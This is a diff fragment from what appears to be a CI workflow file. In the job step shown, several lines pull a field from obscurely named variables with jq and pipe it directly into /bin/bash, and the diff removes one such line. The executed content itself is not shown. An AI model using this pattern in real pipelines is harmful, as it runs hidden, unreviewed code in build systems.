@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$vemc4" | jq -r .rhe26185 | /bin/bash
           printf '%s' "$ptdvt09" | jq -r .tna44 | /bin/bash
           echo $zfir67967 | jq -r .mz159 | /bin/bash
-          printf '%s' "$qb82" | jq -r .g82075 | /bin/bash
 
       - name: Archive output
         if: always()
